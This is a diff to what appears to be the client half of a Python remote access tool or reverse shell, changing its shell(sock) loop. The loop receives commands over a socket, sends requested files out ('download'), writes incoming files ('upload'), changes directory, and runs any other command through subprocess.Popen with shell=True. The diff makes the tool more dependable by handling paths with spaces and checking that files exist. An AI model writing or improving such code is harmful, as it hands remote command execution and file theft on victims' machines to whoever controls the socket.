@@ -56,19 +56,30 @@ def shell(sock):
         result = ''
         command = reliable_recv(sock)
         command_split = command.split(' ')
+
+        if command_split[0] == 'download':
+            toupload = ' '.join(command_split[1:])
+            if os.path.exists(toupload):
+                toreturn = 'Downloading file: ' + str(toupload)
+                reliable_send(sock, toreturn)
+                upload_file(sock, toupload)
+            else:
+                toreturn = 'No such file: ' + str(toupload)
+                reliable_send(sock, toreturn)
+            
+            continue
+
         if command_split[0] == 'quit':
             sigint = True
             break
         elif command_split[0] == 'clear':
             pass
         elif command_split[0] == 'cd':
-            tocd = ''.join(command_split[1:])
-            os.chdir(tocd)
-        elif command_split[0] == 'download':
-            toupload = ''.join(command_split[1:])
-            upload_file(sock, toupload)
+            tocd = ' '.join(command_split[1:])
+            if os.path.exists(tocd):
+                os.chdir(tocd)
         elif command_split[0] == 'upload':
-            todownload = ''.join(command_split[1:])
+            todownload = ' '.join(command_split[1:])
             download_file(sock, todownload)
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
